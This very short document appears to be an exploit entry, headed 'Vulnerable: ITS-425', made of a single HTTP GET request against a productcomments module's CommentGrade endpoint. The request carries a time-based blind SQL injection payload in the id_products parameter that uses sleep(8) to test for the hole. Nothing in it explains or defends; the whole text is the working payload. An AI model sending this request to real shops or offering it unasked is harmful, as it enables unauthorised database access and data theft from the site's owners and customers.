# Vulnerable: ITS-425
GET /module/productcomments/CommentGrade?id_products[]=1*if(now()=sysdate()%2Csleep(8)%2C0)
